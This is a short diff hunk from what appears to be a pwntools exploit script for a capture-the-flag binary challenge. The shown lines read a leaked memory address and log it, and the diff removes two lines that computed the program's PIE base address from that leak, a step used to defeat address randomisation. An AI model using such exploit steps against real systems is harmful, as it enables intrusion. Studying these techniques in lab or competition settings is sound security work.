@@ -45,7 +45,4 @@ io.recvuntil('A\n')
 leaked = unpack(io.recv()[:6].ljust(8, b"\x00"))
 info("Leaked address: %#x", leaked)
 
-elf.address = leaked - 0x40c0 # .bss - &DAT_001040c0
-info('ELF pie base address %#x', elf.address)
-
 #io.interactive()
